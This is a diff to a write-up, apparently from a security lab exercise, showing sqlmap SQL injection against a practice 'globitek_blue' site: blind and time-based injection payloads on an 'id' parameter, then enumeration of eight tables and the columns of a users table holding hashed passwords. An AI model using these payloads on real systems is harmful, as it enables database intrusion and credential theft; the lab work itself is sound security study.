@@ -141,3 +141,61 @@ available databases [7]:
 [*] performance_schema
 [*] sys
 ```
+I then delved into the `globitek_blue` database and found the following:
+```
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1' AND 9112=9112 AND 'pmxf'='pmxf
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind (comment)
+    Payload: id=1' OR SLEEP(5)#
+---
+[21:33:29] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 16.04 (xenial)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.0.12
+[21:33:29] [INFO] fetching tables for database: 'globitek_blue'
+[21:33:29] [INFO] fetching number of tables for database 'globitek_blue'
+[21:33:29] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[21:33:29] [INFO] retrieved:
+sqlmap got a 302 redirect to 'https://35.225.94.156:443/blue/public/territories.php'. Do you want to follow? [Y/n]
+8
+[21:33:34] [INFO] retrieved: countries
+[21:33:52] [INFO] retrieved: failed_logins
+[21:34:19] [INFO] retrieved: feedback
+[21:34:36] [INFO] retrieved: salespeople
+[21:34:58] [INFO] retrieved: salespeople_territories
+[21:35:24] [INFO] retrieved: states
+[21:35:36] [INFO] retrieved: territories
+[21:35:59] [INFO] retrieved: users
+Database: globitek_blue
+[8 tables]
++-------------------------+
+| countries               |
+| failed_logins           |
+| feedback                |
+| salespeople             |
+| salespeople_territories |
+| states                  |
+| territories             |
+| users                   |
++-------------------------+
+```
+I then investigated the `users` table and came up with:
+```
+Table: users
+[7 columns]
++-----------------+--------------+
+| Column          | Type         |
++-----------------+--------------+
+| created_at      | datetime     |
+| email           | varchar(255) |
+| first_name      | varchar(255) |
+| hashed_password | varchar(255) |
+| id              | int(11)      |
+| last_name       | varchar(255) |
+| username        | varchar(255) |
++-----------------+--------------+
+```
